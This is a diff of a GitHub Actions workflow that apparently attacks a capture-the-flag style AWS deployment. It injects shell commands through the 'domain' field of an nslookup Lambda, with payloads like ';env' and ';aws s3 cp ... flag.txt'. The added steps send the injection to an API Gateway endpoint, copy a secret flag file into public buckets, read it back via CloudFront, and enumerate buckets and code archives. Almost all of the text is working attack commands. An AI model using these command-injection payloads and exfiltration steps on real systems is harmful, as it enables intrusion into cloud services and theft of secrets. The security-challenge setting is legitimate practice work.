@@ -19,56 +19,38 @@ jobs:
       - name: AWS identity
         run: aws sts get-caller-identity
 
-      - name: Direct invoke - benign baseline
+      - name: Enumerate other S3 buckets
         run: |
-          aws lambda invoke --function-name nslookupv2 \
-            --payload '{"domain":"example.com"}' \
-            --cli-binary-format raw-in-base64-out \
-            --log-type Tail \
-            --query 'LogResult' --output text out1.txt || echo "direct invoke denied"
-          echo "----- decoded tail -----"
-          cat out1.txt 2>/dev/null | base64 -d 2>/dev/null || true
+          echo "===== platform bucket listing ====="
+          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ || echo "denied"
+          echo "===== site bucket listing ====="
+          aws s3 ls s3://site781fe43f26b9eba3/ || echo "denied"
+          echo "===== try code.zip (maybe different perms from flag.txt) ====="
+          aws s3 cp s3://codec4f26c862a321ef5/code.zip ./code.zip || echo "denied"
+          ls -la code.zip 2>/dev/null && unzip -p code.zip || true
 
-      - name: Direct invoke - env leak
+      - name: Inject - copy flag into site bucket via lambdaRole
         run: |
-          aws lambda invoke --function-name nslookupv2 \
-            --payload '{"domain":";env"}' \
-            --cli-binary-format raw-in-base64-out \
-            --log-type Tail \
-            --query 'LogResult' --output text out2.txt || true
-          echo "----- decoded tail -----"
-          cat out2.txt 2>/dev/null | base64 -d 2>/dev/null || true
+          echo "===== triggering injection: cp flag to site bucket ====="
+          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" \
+            -d '{"domain":";aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://site781fe43f26b9eba3/flag.txt --region us-east-1"}'
+          echo
+          echo "===== triggering injection: cp flag to platform bucket ====="
+          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" \
+            -d '{"domain":";aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://platform-bucket-009661764077-us-east-1/flag.txt --region us-east-1"}'
 
-      - name: Direct invoke - read flag via lambdaRole, cat to logs
-        run: |
-          aws lambda invoke --function-name nslookupv2 \
-            --payload '{"domain":";aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/f.txt --region us-east-1 && cat /tmp/f.txt"}' \
-            --cli-binary-format raw-in-base64-out \
-            --log-type Tail \
-            --query 'LogResult' --output text out3.txt || true
-          echo "----- decoded tail -----"
-          cat out3.txt 2>/dev/null | base64 -d 2>/dev/null || true
+      - name: Wait for async Lambda execution to complete
+        run: sleep 8
 
-      - name: Direct invoke - list bucket via lambdaRole (sanity check)
+      - name: Read flag from CloudFront (if site bucket write worked)
         run: |
-          aws lambda invoke --function-name nslookupv2 \
-            --payload '{"domain":";aws s3 ls s3://codec4f26c862a321ef5/ --region us-east-1"}' \
-            --cli-binary-format raw-in-base64-out \
-            --log-type Tail \
-            --query 'LogResult' --output text out4.txt || true
-          echo "----- decoded tail -----"
-          cat out4.txt 2>/dev/null | base64 -d 2>/dev/null || true
-
-      - name: Inspect API Gateway (why HTTP path always returns static wip)
-        run: |
-          API_ID="3q931syi7b"
-          echo "===== resources ====="
-          aws apigateway get-resources --rest-api-id "$API_ID" || echo "denied"
-          echo "===== stages ====="
-          aws apigateway get-stages --rest-api-id "$API_ID" || echo "denied"
-
-      - name: Fallback - try CloudWatch logs directly
-        run: |
-          aws logs describe-log-streams \
-            --log-group-name /aws/lambda/nslookupv2 \
-            --order-by LastEventTime --descending --limit 3 || echo "logs denied"
+          echo "===== curl CloudFront for flag ====="
+          curl -si https://d67nf28gqfurd.cloudfront.net/flag.txt
+          echo
+          echo "===== direct S3 read on site bucket (cicdRole) ====="
+          aws s3 cp s3://site781fe43f26b9eba3/flag.txt - || echo "denied"
+          echo
+          echo "===== direct S3 read on platform bucket (cicdRole) ====="
+          aws s3 cp s3://platform-bucket-009661764077-us-east-1/flag.txt - || echo "denied"
